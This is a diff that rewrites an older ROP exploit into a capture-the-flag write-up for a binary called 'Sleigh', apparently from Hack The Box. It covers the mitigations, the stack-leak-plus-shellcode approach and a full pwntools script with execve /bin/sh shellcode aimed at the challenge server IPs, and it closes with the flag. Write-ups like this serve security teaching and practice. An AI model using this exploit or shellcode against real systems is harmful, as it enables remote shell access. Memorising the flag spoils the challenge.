@@ -1,20 +1,45 @@
+# Sleigh
+
+## Challenge
+
+Simple binary that has NX disabled.
+
+### Mitigations
+
+```
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+```
+
+## Solution
+
+We are given a stack address leak, so we can overwrite RIP to jump to our buffer.
+
+Since NX is disabled, we can put shellcode in this buffer to spawn a shell.
+
+## Exploit
+
+```py
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # This exploit template was generated via:
-# $ pwn template --host 178.62.32.210 --port 30387 naughty_list
+# $ pwn template --host 138.68.144.222 --port 32698 sleigh
 from pwn import *
 
 # Set up pwntools for the correct architecture
-exe = context.binary = ELF('naughty_list')
-libc = ELF('libc.so.6')
+exe = context.binary = ELF('sleigh')
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 # ./exploit.py GDB HOST=example.com PORT=4141
-host = args.HOST or '178.62.32.210'
-port = int(args.PORT or 30387)
+host = args.HOST or '138.68.144.222'
+port = int(args.PORT or 32698)
 
 def start_local(argv=[], *a, **kw):
     '''Execute the target binary locally'''
@@ -51,44 +76,31 @@ continue
 # Arch:     amd64-64-little
 # RELRO:    Full RELRO
 # Stack:    No canary found
-# NX:       NX enabled
-# PIE:      No PIE (0x400000)
+# NX:       NX disabled
+# PIE:      PIE enabled
+# RWX:      Has RWX segments
 
 io = start()
 
-rop = ROP(exe)
+io.sendlineafter(b"> ", b"1")
+io.recvuntil(b"sleigh: [")
+leak = int(io.recvuntil(b"]", drop=True), 0)
+
+log.success("Leak: " + hex(leak))
+
+# Shellcode from http://shell-storm.org/shellcode/files/shellcode-806.php by Dad`
+shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
 
 payload = flat({
-    0x20 + 0x8: [
-        rop.find_gadget(["pop rdi", "ret"])[0],
-        exe.got["puts"],
-        exe.plt["puts"],
-        exe.sym["get_descr"],
-        ],
+    0: shellcode,
+    0x40 + 0x8: leak,
     })
 
-io.sendlineafter(b":", b"a")
-io.sendlineafter(b":", b"a")
-io.sendlineafter(b":", b"18")
-io.sendlineafter(b":", payload)
-
-io.recvuntil(b"\xf0\x9f\x8e\x81")
-io.recvline()
-libc.address = u64(io.recvline()[:-1].ljust(8, b'\x00')) - libc.sym["puts"]
-
-io.sendlineafter(b":", payload)
-log.success(hex(libc.address))
-
-payload = flat({
-    0x20 + 0x8: [
-        rop.find_gadget(["ret"])[0],
-        rop.find_gadget(["pop rdi", "ret"])[0],
-        next(libc.search(b"/bin/sh")),
-        libc.sym["system"],
-        ],
-    })
-
-io.sendlineafter(b":", payload)
+io.sendlineafter(b"> ", payload)
 
 io.interactive()
+```
 
+## Flag
+
+`HTB{d4sh1nG_thr0ugH_th3_sn0w_1n_4_0n3_h0r53_0p3n_sl31gh!!!}`
